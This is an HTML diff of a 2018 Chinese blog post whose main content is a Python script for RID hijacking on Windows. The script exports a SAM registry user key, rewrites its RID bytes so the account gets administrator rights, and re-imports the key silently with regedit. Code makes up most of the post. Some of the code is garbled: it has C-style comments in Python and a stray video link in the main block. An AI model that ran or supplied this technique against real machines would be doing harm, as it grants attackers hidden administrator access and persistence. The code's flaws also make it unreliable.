@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang=九世>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言上个星期的时候在弄rid劫持的实验，当时想用python写个rid劫持的操作。后面时间不够上学了这个星期回来整了出来。星期五被win32API弄的心态崩了= =后面换了种思路 #正文#先说一下一开始的思路123一开始我是想着用win32API和win32con读取注册表的键值进行修改的但是REG_BINARY类型的值死活你用bytes类型的格式进行修改，后面我查了读取出来键值的值的编码类型，解">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python实现rid劫持">
+<meta property="og:url" content="http://yoursite.com/2018/10/27/python实现rid劫持/index.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言上个星期的时候在弄rid劫持的实验，当时想用python写个rid劫持的操作。后面时间不够上学了这个星期回来整了出来。星期五被win32API弄的心态崩了= =后面换了种思路 #正文#先说一下一开始的思路123一开始我是想着用win32API和win32con读取注册表的键值进行修改的但是REG_BINARY类型的值死活你用bytes类型的格式进行修改，后面我查了读取出来键值的值的编码类型，解">
+<meta property="og:locale" content="九世">
+<meta property="og:image" content="https://s1.ax1x.com/2018/10/27/i65Mb8.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2018/10/27/i6535Q.png">
+<meta property="og:updated_time" content="2018-10-27T04:25:02.598Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="python实现rid劫持">
+<meta name="twitter:description" content="前言上个星期的时候在弄rid劫持的实验，当时想用python写个rid劫持的操作。后面时间不够上学了这个星期回来整了出来。星期五被win32API弄的心态崩了= =后面换了种思路 #正文#先说一下一开始的思路123一开始我是想着用win32API和win32con读取注册表的键值进行修改的但是REG_BINARY类型的值死活你用bytes类型的格式进行修改，后面我查了读取出来键值的值的编码类型，解">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/10/27/i65Mb8.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>python实现rid劫持</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/10/20/about/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/27/python实现rid劫持/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/27/python实现rid劫持/&text=python实现rid劫持"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/27/python实现rid劫持/&is_video=false&description=python实现rid劫持"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python实现rid劫持&body=Check out this article: http://yoursite.com/2018/10/27/python实现rid劫持/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/27/python实现rid劫持/&name=python实现rid劫持&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        python实现rid劫持
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-10-27T02:47:52.000Z" itemprop="datePublished">2018-10-27</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个星期的时候在弄rid劫持的实验，当时想用python写个rid劫持的操作。后面时间不够上学了<br>这个星期回来整了出来。星期五被win32API弄的心态崩了= =后面换了种思路<br><img src="https://s1.ax1x.com/2018/10/27/i65Mb8.jpg" alt="i65Mb8.jpg"></p>
+<p>#正文#<br>先说一下一开始的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一开始我是想着用win32API和win32con读取注册表的键值进行修改的</span><br><span class="line">但是REG_BINARY类型的值死活你用bytes类型的格式进行修改，后面我查了</span><br><span class="line">读取出来键值的值的编码类型，解码出来简直是神鬼难救啊，这改个鬼鬼哦</span><br></pre></td></tr></table></figure></p>
+<p>解出来的是这种东西，你不解就修改不了，因为他是bytes类型<br><img src="https://s1.ax1x.com/2018/10/27/i6535Q.png" alt="i6535Q.png"></p>
+<p>后面今天早上的思路就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用reg命令导出成reg文件，然后修改指定位置的值</span><br><span class="line">在用regdeit  /s  xx.reg,在用win32API读取修改位置的</span><br><span class="line">值进行对比，如果匹配就劫持成功</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import win32api</span><br><span class="line">import win32con</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">n=0</span><br><span class="line">def rid_hack(path):</span><br><span class="line">    try:</span><br><span class="line">        ps_numer=&apos;REG EXPORT HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003F1  &#123;&#125;AppBkUp.reg&apos;.format(path) </span><br><span class="line">        zx=os.system(ps_numer) //导出HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003F1的键值</span><br><span class="line">        n=1</span><br><span class="line">        print(&apos;[+] 命令执行成功&apos;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">    time.sleep(1)</span><br><span class="line">    if os.path.exists(&apos;&#123;&#125;AppBkUp.reg&apos;.format(path)): //判断导出的reg 文件是否存在</span><br><span class="line">        print(&apos;[+] ok reg is ok&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] reg in not found&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    dk=open(&apos;&#123;&#125;AppBkUp.reg&apos;.format(path),&apos;r&apos;,encoding=&apos;utf-16&apos;)</span><br><span class="line">    xj=open(&apos;&#123;&#125;Rid_Hack.reg&apos;.format(path),&apos;w&apos;,encoding=&apos;utf-16&apos;)</span><br><span class="line">    for line in dk:</span><br><span class="line">        if &apos;f1&apos; in line:</span><br><span class="line">            line=line.replace(&apos;f1&apos;,&apos;f4&apos;).replace(&apos;03&apos;,&apos;01&apos;) //修改键值</span><br><span class="line">        xj.write(line)</span><br><span class="line"></span><br><span class="line">    dk.close()</span><br><span class="line">    xj.close()</span><br><span class="line"></span><br><span class="line">    zxw=os.system(&apos;regedit /s &#123;&#125;Rid_Hack.reg&apos;.format(path)) //导入注册表</span><br><span class="line">    key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, &apos;SAM\\SAM\\Domains\\Account\\Users\\000003F1&apos;, 0,win32con.KEY_ALL_ACCESS)</span><br><span class="line">    a = win32api.RegQueryValueEx(key, &apos;F&apos;)  //读取F的键值</span><br><span class="line">    if &apos;xf4&apos; and &apos;x01&apos; in str(a[0]): //判断是否存在</span><br><span class="line">        print(&apos;[+] rid劫持成功&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] rid劫持失败&apos;)</span><br><span class="line">if __name__ == &apos;__main__&apos;:[VID_20181027_103535.mp4](attachments\6a167db9.mp4)</span><br><span class="line">    user=input(&quot;路径：&quot;)</span><br><span class="line">    rid_hack(user)</span><br></pre></td></tr></table></figure></p>
+<p>测试结果：</p>
+<p><iframe width="560" height="315" src="https://www.youtube.com/embed/2GnRs-v28Uk" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe><br>转载请声明转自：422926799.github.io</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/27/python实现rid劫持/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/27/python实现rid劫持/&text=python实现rid劫持"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/27/python实现rid劫持/&is_video=false&description=python实现rid劫持"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python实现rid劫持&body=Check out this article: http://yoursite.com/2018/10/27/python实现rid劫持/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/27/python实现rid劫持/&title=python实现rid劫持"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/27/python实现rid劫持/&name=python实现rid劫持&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/422926799">Projectes</a></li>
+         
+          <li><a href="/Search">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
